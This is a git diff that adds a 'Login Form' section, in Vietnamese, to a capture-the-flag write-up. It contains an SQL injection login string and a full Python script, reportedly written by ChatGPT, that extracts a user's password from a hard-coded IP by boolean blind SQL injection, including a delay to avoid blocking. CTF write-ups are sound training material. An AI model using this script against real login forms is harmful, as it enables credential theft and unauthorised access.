@@ -11,6 +11,7 @@
 - [Web6](https://github.com/DucThinh47/VibloCTF-Writeups#web6)
 - [phpinfo.php](https://github.com/DucThinh47/VibloCTF-Writeups#phpinfophp)
 - [Web5](https://github.com/DucThinh47/VibloCTF-Writeups#web5)
+- [Login Form]()
 #### Web7
 
 ![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image0.png?raw=true)
@@ -400,7 +401,82 @@ Tiếp theo tôi chèn payload:
 Tìm được file là `/src/_uh_oh_what_is_this_file.txt`, thử đọc nội dung file này và tìm được flag:
 
 ![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image47.png?raw=true)
+#### Login Form
 
+![img](48)
+
+Là một trang login, khi tôi thử nhập username là `admin' ' OR '1'='1` và password random thì website trả về như sau:
+
+![img](49)
+
+Thông báo cho thấy flag chính là mật khẩu của username `flag`. Như vậy, tôi sẽ phải tìm ra mật khẩu của user này. 
+
+Tôi đã nhờ chat gpt viết một đoạn code:
+
+    import requests
+    import string
+    import time
+
+    URL = "http://172.104.49.143:1323/"
+    SUCCESS_TEXT = "Success"
+
+    # Charset thường dùng trong flag CTF
+    CHARSET = string.ascii_letters + string.digits + "{}_"
+
+    def go(payload, retries=3):
+        """Gửi request với retry khi bị lỗi kết nối"""
+        for _ in range(retries):
+            try:
+                r = requests.post(URL, data=payload, timeout=10)
+                return r.text
+            except requests.exceptions.RequestException:
+                print("[!] Connection error, retrying...")
+                time.sleep(2)
+        return ""
+
+    print("[*] Get length of password")
+    length = 0
+    for i in range(1, 100):
+        payload = {
+            "login": "",
+            "username": f"flag' AND LENGTH(password)={i}-- -",
+            "password": "123"
+        }
+        ans = go(payload)
+        if SUCCESS_TEXT in ans:
+            length = i
+            print(f"[+] Password length: {length}")
+            break
+
+    print("\n[*] Get password")
+
+    # Resume nếu cần (ví dụ đã brute được "Flag{bl1nd_sql")
+    password = ""
+
+    for pos in range(len(password) + 1, length + 1):  # vị trí ký tự bắt đầu từ 1
+        found = False
+        for ch in CHARSET:
+            payload = {
+                "login": "",
+                "username": f"flag' AND BINARY SUBSTRING(password,{pos},1)='{ch}'-- -",
+                "password": "123"
+            }
+            ans = go(payload)
+            if SUCCESS_TEXT in ans:
+                password += ch
+                print(f"[+] Position {pos}: {password}")
+                found = True
+                break
+            time.sleep(0.2)  # delay nhỏ để tránh bị chặn
+        if not found:
+            print(f"[!] Cannot find char at position {pos}, stopping.")
+            break
+
+    print("\n[+] Final extracted password:", password)
+
+Cuối cùng tìm được flag:
+
+![img](50)
 
 
 
